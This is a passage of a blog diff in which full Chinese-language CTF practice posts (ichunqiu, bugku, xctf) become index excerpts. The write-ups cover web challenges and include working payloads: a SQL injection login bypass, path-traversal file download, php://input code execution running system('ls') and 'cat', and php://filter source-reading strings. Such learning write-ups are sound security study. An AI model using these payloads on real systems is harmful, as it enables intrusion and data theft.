-<p>GetFlag(ichunqiu)<br>打开链接被正常嘲讽，还是提示了登录可以下载文件获得flag啥的。看源码没有发现有啥问题，登录呗。<br>除了账号密码还有个验证码，每次刷新会变。起初是脚本md5生成验证码加SQL注入，但是先手注尝试admin’— 就直接成功了。。。<br>登录后果然有三个文件可以下载，最后的a.php提示flag在根目录,根据源码中三个文件的下载链接知道是在./file/download.php?f=filename.php下载文件，尝试../寻找根目录以及伪协议读取但一直得到flag{wow!!!but not true}，应该是被过滤了，尝试大写双写绕过均失败<br>网上找wp知道Linux web网站的默认路径 /var/www/html，构造payload: f= /var/www/html/flag.php不行，再试f=/var/www/html/Challenges/flag.php成功下载flag.php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f &#x3D; $_POST[&#39;flag&#39;];</span><br><span class="line">$f &#x3D; str_replace(array(&#39;&#96;&#39;, &#39;$&#39;, &#39;*&#39;, &#39;#&#39;, &#39;:&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;.&#39;, &#39;&gt;&#39;), &#39;&#39;, $f);</span><br><span class="line">if((strlen($f) &gt; 13) || (false !&#x3D;&#x3D; stripos($f, &#39;return&#39;)))</span><br><span class="line">&#123;</span><br><span class="line">		die(&#39;wowwwwwwwwwwwwwwwwwwwwwwwww&#39;);</span><br><span class="line">&#125;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">		 eval(&quot;\$spaceone &#x3D; $f&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception $e)</span><br><span class="line">&#123;</span><br><span class="line">		return false;</span><br><span class="line">&#125;</span><br><span class="line">if ($spaceone &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">	echo file_get_contents(&quot;helloctf.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>flag.php网页下构造flag=flag;查看源码得到flag<br>起初一直用bp拦包传参，但是这道题不行，用hackBar对比后发现hackbar加了请求头Content-Type: application/x-www-form-urlencoded</p>
-<p><a href="https://blog.csdn.net/iamsongyu/article/details/84567438" target="_blank" rel="noopener">CTF-web Linux中几个关键的文件</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/18/20-09-18/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/18/20-09-18/">20-09-18</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/18/20-09-18/">
+          
+          
+            
+          
+          感觉还是好多不会，知识点太散了。。: )
+
+include(ichunqiu)phpinfo()中发现allow_url_include是打开的，可以用php://input&lt;?php system(&quot;ls&quot;);?&gt;得到目录&lt;?php system(&quot;cat file_name&quot;);?&gt;得到flag或者用php://filter得到f
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-18 11:22" pubdate>
+              2020-09-18
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/18/20-09-18/" itemprop="url">20-09-18</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-18T11:22:45+08:00">
-                2020-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  83 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>感觉还是好多不会，知识点太散了。。: )</p>
-<hr>
-<p>include(ichunqiu)<br>phpinfo()中发现allow_url_include是打开的，可以用php://input<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>得到目录<br><code>&lt;?php system(&quot;cat file_name&quot;);?&gt;</code>得到flag<br>或者用php://filter得到flag</p>
-<hr>
-<p>破译(ichunqiu)<br>根据flag四个字符猜测移位密码以及各种英文猜测即可得到解密后的flag</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/17/20-9-17/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/17/20-9-17/">20-9-17</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/17/20-9-17/">
+          
+          
+            
+          
+          NaNNaNNaNNaN-Batman（xctf）下载附件后发现是一段混乱的js代码，发现eval函数，可能是js混淆加密，和昨天的题类似。直接输入到控制台生成一个提交界面，通过console.log()把混淆的js代码解密得到以下内容：function  $()&#123;
+
+	var  e=document.getElementById("c").value;
+
+	if(e.length==1
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-17 18:58" pubdate>
+              2020-09-17
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/17/20-9-17/" itemprop="url">20-9-17</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-17T18:58:49+08:00">
-                2020-09-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  226 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>NaNNaNNaNNaN-Batman（xctf）<br>下载附件后发现是一段混乱的js代码，发现eval函数，可能是js混淆加密，和昨天的题类似。直接输入到控制台生成一个提交界面，通过console.log()把混淆的js代码解密得到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">function  $()&#123;</span><br><span class="line"></span><br><span class="line">	var  e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line"></span><br><span class="line">	if(e.length&#x3D;&#x3D;16)</span><br><span class="line"></span><br><span class="line">		if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line"></span><br><span class="line">			if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line"></span><br><span class="line">				if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line"></span><br><span class="line">					if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)&#123;</span><br><span class="line"></span><br><span class="line">						var  t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line"></span><br><span class="line">						var  n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line"></span><br><span class="line">						var  r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line"></span><br><span class="line">						var  i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line"></span><br><span class="line">						var  s&#x3D;[t,n,r,i];</span><br><span class="line"></span><br><span class="line">						for(var  o&#x3D;0;o&lt;13;++o)&#123;</span><br><span class="line"></span><br><span class="line">							document.write(s[o%4][0]);s[o%4].splice(0,1)</span><br><span class="line"></span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);</span><br><span class="line"></span><br><span class="line">delete _</span><br></pre></td></tr></table></figure><br>根据if语句构造提交字符串或者根据生成flag的代码直接写成flag都行</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/16/20-09-16/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/16/20-09-16/">20-09-16</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/16/20-09-16/">
+          
+          
+            
+          
+          虽然花了很多时间才得到flag居然莫名很开心。。。江湖魔头(bugku)进界面发现是个小游戏，查看源码发现链接指向wulin.php?action=start，没有其他信息，点进链接洗点界面，在源码上依然发现啥，继续游戏，大概是要挣钱买如来神掌。在源码上没有发现什么，想抓包修改发现请求头只有cookie，可以猜测相关角色数据信息就在cookie的user里，先url解码再base64解码，结果只得
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-16 11:17" pubdate>
+              2020-09-16
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/16/20-09-16/" itemprop="url">20-09-16</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-16T11:17:40+08:00">
-                2020-09-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  308 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>虽然花了很多时间才得到flag居然莫名很开心。。。<br>江湖魔头(bugku)<br>进界面发现是个小游戏，查看源码发现链接指向wulin.php?action=start，没有其他信息，点进链接洗点界面，在源码上依然发现啥，继续游戏，大概是要挣钱买如来神掌。在源码上没有发现什么，想抓包修改发现请求头只有cookie，可以猜测相关角色数据信息就在cookie的user里，先url解码再base64解码，结果只得到一串乱码。。。<br>已经明确猫腻在cookie里，尝试寻找其相关代码，查看三个js文件，base,js和md5.js都比较好理解，但是script.js看不懂。。参考一下别人的wp发现这个js文件是加密混淆处理过的。<br><a href="https://strcpy.me/index.php/archives/213/" target="_blank" rel="noopener">js加密</a><br>把三个js文件复制到本地，通过console.log(p)得到script.js。这下终于看懂了，大致步骤就是将cookie是明文加密得到的，通过script.js提供的解密算法得到当前cookie的明文，修改后自己编写加密算法得到cookie，从而打败boss得到flag。<br><del>为啥会开心捏~(￣▽￣)~*，可能是开挂的感觉真好</del></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/15/20-09-15/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/15/20-09-15/">20-09-15</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/15/20-09-15/">
+          
+          
+            
+          
+          一道时间盲注弄不出来，一道布尔盲注被暴力破解了。。注意补上
+
+Trim(bugku)登录注册重置密码界面都尝试sql注入，发现只会提示mysql connect error!，用bp扫描目录发现clear.php，show.php，以及index.php会重定向到login.php，flag就在show.php里面。。
+
+文件上传2(湖湘杯)(bugku)做的莫名其妙。。。总感觉最后一行是被人改的
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-15 09:18" pubdate>
+              2020-09-15
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/15/20-09-15/" itemprop="url">20-09-15</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-15T09:18:41+08:00">
-                2020-09-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  234 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>一道时间盲注弄不出来，一道布尔盲注被暴力破解了。。注意补上</p>
-<hr>
-<p>Trim(bugku)<br>登录注册重置密码界面都尝试sql注入，发现只会提示mysql connect error!，用bp扫描目录发现clear.php，show.php，以及index.php会重定向到login.php，flag就在show.php里面。。</p>
-<hr>
-<p>文件上传2(湖湘杯)(bugku)<br>做的莫名其妙。。。<br><img src="/2020/09/15/20-09-15/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-15%20094700.jpg?v=1&amp;type=image" alt="输入图片描述"><br>总感觉最后一行是被人改的。。<br>图片链接和upload链接都没有用<br>看wp发现是用php filter。。<br>op=php://filter/read=convert.base64-encode/resource=index.php还是没有，改成resource=../index.php结果得到<em>Try it again and I will kill you! I freaking hate hackers!</em><br>想到点图片链接时跳到的是op=home，点upload链接跳到op=upload，猜测是不加php，于是构造payload:op=php://filter/read=convert.base64-encode/resource=index得到index.php源码。果然是过滤..以及自动加.php后缀，尝试op=php://filter/read=convert.base64-encode/resource=flag得到结果</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/14/20-09-14/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/14/20-09-14/">20-09-14</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/14/20-09-14/">
+          
+          
+            
+          
+           PHP_encrypt_1(ISCCCTF)(bugku) 很简单的解密题，居然错了好几次。。 php的求模运算得到的结果正负和被除数相同。。一直习惯了python的求模结果和除数相同，想着不用去处理负数情况，结果: )，早知道用python写了。 php: -5 % 3 = -2 python: -5 % 3 = 1  &lt;?php
+function decrypt($str)
+&#123
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-14 10:08" pubdate>
+              2020-09-14
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/14/20-09-14/" itemprop="url">20-09-14</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-14T10:08:14+08:00">
-                2020-09-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  275 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p> PHP_encrypt_1(ISCCCTF)(bugku)<br> 很简单的解密题，居然错了好几次。。<br> php的求模运算得到的结果正负和被除数相同。。一直习惯了python的求模结果和除数相同，想着不用去处理负数情况，结果: )，早知道用python写了。<br> php: -5 % 3 = -2<br> python: -5 % 3 = 1<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">function decrypt($str)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5(&#39;ISCC&#39;);</span><br><span class="line">    $klen &#x3D; strlen($key);</span><br><span class="line">    $str &#x3D; base64_decode($str);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $data &#x3D; &quot;&quot;;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        if($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x];</span><br><span class="line">        $x +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $tmp &#x3D; ord($str[$i]) - ord($char[$i]);</span><br><span class="line">        while($tmp &lt; 0)&#x2F;&#x2F;处理负数结果</span><br><span class="line">            $tmp +&#x3D; 128;</span><br><span class="line">        $data .&#x3D; chr($tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; &quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;&quot;;</span><br><span class="line">echo decrypt($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>flag.php(bugku)<br>一个按钮没有用的表格，查看源码没发现什么问题，尝试flag.php页面存在但是没有任何内容，注意题目描述的hint，回到初始页面get传参hint，得到php代码，序列化Key传入cookie即可。注意Key没有初始化因此”Key”=””，以及序列化得到的;因为要传入cookie要url编码成%3b</p>
-<hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
